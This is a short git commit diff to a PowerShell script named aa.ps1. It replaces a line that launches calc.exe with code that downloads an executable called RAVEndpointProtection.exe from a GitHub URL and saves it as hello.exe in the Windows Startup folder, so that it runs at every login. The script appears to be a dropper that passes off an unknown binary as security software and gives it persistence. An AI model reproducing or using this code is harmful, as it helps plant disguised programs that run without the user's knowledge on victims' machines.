291a7a26190973dfff29b1f99d2eb9bfd5a1e05f
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-27 19:38:20 +0300

    Update aa.ps1

--- aa.ps1
+++ aa.ps1
@@ -1,1 +1,13 @@
-Start-Process "calc.exe"
+# Define the URL of the file to download and the destination path
+$fileUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/RAVEndpointProtection.exe"
+$destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hello.exe"
+
+# Download the file
+Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
+
+# Verify the download
+if (Test-Path $destinationPath) {
+    Write-Output "File downloaded successfully and saved to startup folder as hello.exe"
+} else {
+    Write-Output "Failed to download the file."
+}
